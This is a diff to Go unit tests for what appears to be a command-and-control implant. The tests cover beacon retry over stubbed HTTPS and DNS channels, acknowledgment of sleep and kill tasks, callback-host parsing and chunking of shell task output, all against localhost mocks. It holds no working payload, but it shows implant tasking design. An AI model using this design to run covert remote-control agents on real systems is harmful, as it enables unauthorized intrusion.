@@ -41,7 +41,7 @@ func TestRunRetainsPendingResultUntilBeaconDeliverySucceeds(t *testing.T) {
 	beaconNonceFn = func() ([]byte, error) {
 		return nonceValue, nil
 	}
-	sendBeaconDNSFn = func([]byte, string) ([]byte, error) {
+	sendBeaconDNSFn = func([]byte, string, string, []byte) ([]byte, error) {
 		return nil, errors.New("dns disabled")
 	}
 
@@ -70,6 +70,11 @@ func TestRunRetainsPendingResultUntilBeaconDeliverySucceeds(t *testing.T) {
 				t.Fatalf("expected pending result to be retained after failure, got %#v", beacon.TaskOutput)
 			}
 			return encodeTaskForTest(t, secret, &protocol.Task{ID: "task-2", Type: "kill", Payload: ""}), nil
+		case 4:
+			if beacon.TaskOutput == nil || beacon.TaskOutput.TaskID != "task-2" {
+				t.Fatalf("expected kill acknowledgment on final beacon, got %#v", beacon.TaskOutput)
+			}
+			return encodeTaskForTest(t, secret, &protocol.Task{Type: "noop"}), nil
 		default:
 			t.Fatalf("unexpected beacon call %d", callCount)
 			return nil, nil
@@ -78,8 +83,60 @@ func TestRunRetainsPendingResultUntilBeaconDeliverySucceeds(t *testing.T) {
 
 	Run(cfg)
 
-	if callCount != 3 {
-		t.Fatalf("expected 3 beacon attempts, got %d", callCount)
+	if callCount != 4 {
+		t.Fatalf("expected 4 beacon attempts, got %d", callCount)
+	}
+}
+
+func TestRoutedHostIPUsesAgentRouteInsteadOfCallbackAddress(t *testing.T) {
+	if got := routedHostIP("https://127.0.0.1:443"); got != "127.0.0.1" {
+		t.Fatalf("routedHostIP = %q, want 127.0.0.1", got)
+	}
+	if got := routedHostIP("not a URL"); got != "" {
+		t.Fatalf("invalid callback returned host IP %q", got)
+	}
+}
+
+func TestRunDeliversSleepAndKillAcknowledgments(t *testing.T) {
+	secret := []byte("0123456789abcdef0123456789abcdef")
+	cfg := &Config{AgentID: "agent-ack", Secret: secret, ServerURL: "https://127.0.0.1:443", SleepSeconds: 30, CertFingerprint: []byte("unused")}
+	origNonceFn, origHTTPSFn := beaconNonceFn, sendBeaconHTTPSFn
+	t.Cleanup(func() {
+		beaconNonceFn, sendBeaconHTTPSFn = origNonceFn, origHTTPSFn
+		atomic.StoreInt32(&interactiveMode, 0)
+	})
+	atomic.StoreInt32(&interactiveMode, 1)
+	beaconNonceFn = func() ([]byte, error) { return []byte("0123456789abcdef"), nil }
+
+	calls := 0
+	sendBeaconHTTPSFn = func(_ *http.Client, _ string, payload []byte) ([]byte, error) {
+		calls++
+		beacon, err := protocol.DecodeBeacon(payload, secret)
+		if err != nil {
+			t.Fatal(err)
+		}
+		switch calls {
+		case 1:
+			return encodeTaskForTest(t, secret, &protocol.Task{ID: "sleep-1", Type: "sleep", Payload: "7"}), nil
+		case 2:
+			if beacon.TaskOutput == nil || beacon.TaskOutput.TaskID != "sleep-1" || beacon.TaskOutput.Output != "sleep acknowledged" {
+				t.Fatalf("missing sleep acknowledgment: %#v", beacon.TaskOutput)
+			}
+			return encodeTaskForTest(t, secret, &protocol.Task{ID: "kill-1", Type: "kill"}), nil
+		case 3:
+			if beacon.TaskOutput == nil || beacon.TaskOutput.TaskID != "kill-1" {
+				t.Fatalf("missing kill acknowledgment: %#v", beacon.TaskOutput)
+			}
+			return nil, nil
+		default:
+			t.Fatalf("unexpected beacon call %d", calls)
+			return nil, nil
+		}
+	}
+
+	Run(cfg)
+	if calls != 3 || cfg.SleepSeconds != 7 {
+		t.Fatalf("calls=%d sleep=%d", calls, cfg.SleepSeconds)
 	}
 }
 
@@ -207,6 +264,23 @@ func TestChunkTaskResultKeepsErrorsWhole(t *testing.T) {
 	})
 	if len(chunks) != 1 || chunks[0].ChunkTotal != 0 {
 		t.Fatalf("expected error result to remain unchunked, got %#v", chunks)
+	}
+}
+
+func TestChunkTaskResultPreservesWarnings(t *testing.T) {
+	chunks := chunkTaskResult(&protocol.TaskResult{
+		TaskID:  "task-warning",
+		Type:    "shell",
+		Output:  strings.Repeat("x", resultChunkBytes+1),
+		Warning: "exit status 1",
+	})
+	if len(chunks) != 2 {
+		t.Fatalf("expected warning output to be chunked, got %#v", chunks)
+	}
+	for _, chunk := range chunks {
+		if chunk.Warning != "exit status 1" || chunk.Error != "" {
+			t.Fatalf("warning metadata was not preserved: %#v", chunk)
+		}
 	}
 }
 
